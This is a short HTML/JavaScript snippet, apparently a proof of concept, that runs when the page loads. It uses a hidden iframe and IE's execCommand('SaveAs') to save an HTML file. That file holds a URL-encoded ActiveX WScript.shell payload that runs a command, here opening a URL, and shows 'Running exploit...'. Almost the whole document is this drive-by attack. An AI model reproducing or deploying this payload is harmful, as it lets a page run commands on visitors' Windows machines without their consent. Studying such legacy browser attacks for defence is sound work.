<script>
/*
function downloadFileIE(data, fileName, mimeType) {
    const blob = new Blob([data], { type: mimeType });

    if (navigator.msSaveBlob) {
        // IE 10+ and Edge
        navigator.msSaveBlob(blob, fileName);
    } else {
        // For older versions of IE
        const blobObject = window.BlobBuilder || window.MozBlobBuilder || window.WebKitBlobBuilder || window.MSBlobBuilder;
        const bb = new blobObject();
        bb.append(data);
        const blob2 = bb.getBlob(mimeType);
        window.navigator.msSaveBlob(blob2, fileName);
    }
}
*/

function legacyBrowserSave(content, filename) {
  const frame = document.createElement("iframe");
  document.body.appendChild(frame);

  frame.contentWindow.document.open("text/html", "replace");
  frame.contentWindow.document.write(content);
  frame.contentWindow.document.close();

  frame.contentWindow.focus();
  frame.contentWindow.document.execCommand("SaveAs", true, filename);
  document.body.removeChild(frame);
  return false;
}

// Example usage
const fileData = "%3Cscript>var objShell = new ActiveXObject('WScript.shell');objShell.run('https://google.com');%3C/script><h1>Running exploit...</h1>";
const fileName = 'ssfntest.html';
const mimeType = 'text/html';

legacyBrowserSave(fileData, fileName);
</script>
